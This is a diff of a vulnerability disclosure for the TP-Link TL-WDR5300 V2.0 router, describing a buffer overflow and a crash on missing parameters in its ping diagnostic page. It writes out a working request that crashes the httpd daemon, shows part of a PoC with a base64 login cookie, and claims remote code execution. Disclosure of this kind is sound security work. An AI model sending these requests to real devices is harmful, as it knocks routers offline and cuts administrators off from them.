@@ -1,4 +1,4 @@
-# TL-WDR5300 V2
+# Stack-based Buffer Overflow and Multiple Input Validation Vulnerabilities in TP-Link TL-WDR5300 V2.0
 Manufacturer: TP-Link
 
 Model: TL-WDR5300 V2.0
@@ -21,6 +21,13 @@ Impact: Persistent Denial of Service (DoS)
 Upon sending the malformed request (either the overflow payload or empty parameters), the httpd daemon encounters a Segmentation Fault. Since the httpd service is responsible for the web management interface, the router becomes completely inaccessible via the browser. 
 This results in a persistent Denial of Service, requiring a physical power cycle to restore administrative access.
 
+Impact: > 1. Remote Code Execution (RCE): Overwriting the $RA register via ping_addr allows for arbitrary command execution. 2. System Inaccessibility: Triggering the NULL pointer dereference (via empty parameters) causes the web management service to terminate. The administrator loses all control over the device until a hard reboot is performed.
+
+
+
+### Denial of Service (DoS) via Parameter Omission
+The diagnostic module fails to handle empty or missing parameters. Sending the following request will cause the `httpd` daemon to crash (Segmentation Fault):
+`GET /userRpm/PingIframeRpm.htm?ping_addr=127.0.0.1&isNew=&sendNum=&pSize=&overTime= HTTP/1.1`
 
 # POC1
 ```
@@ -67,11 +74,9 @@ Cookie: Authorization=Basic%20YWRtaW46ODg4ODg4ODg%3D
 Connection: close
 ```
 POC omitting the remaining two parameters
+<img width="2021" height="1191" alt="image" src="https://github.com/user-attachments/assets/ca033cb2-6363-4e28-ab3a-57f893826964" />
+<img width="1979" height="1186" alt="image" src="https://github.com/user-attachments/assets/ab2d7c7f-a06e-4080-be9f-97206a5684a2" />
+<img width="1776" height="1150" alt="image" src="https://github.com/user-attachments/assets/e9153151-b611-4910-a117-2a2c0fa5ea59" />
 
-
-
-
-<img width="1419" height="786" alt="image" src="https://github.com/user-attachments/assets/e7826ee8-78c0-4ea0-8fe6-74d244eaac5a" />
-<img width="1287" height="764" alt="image" src="https://github.com/user-attachments/assets/c86d1592-21e3-4175-9880-0bd45f5f92c0" />
 
 
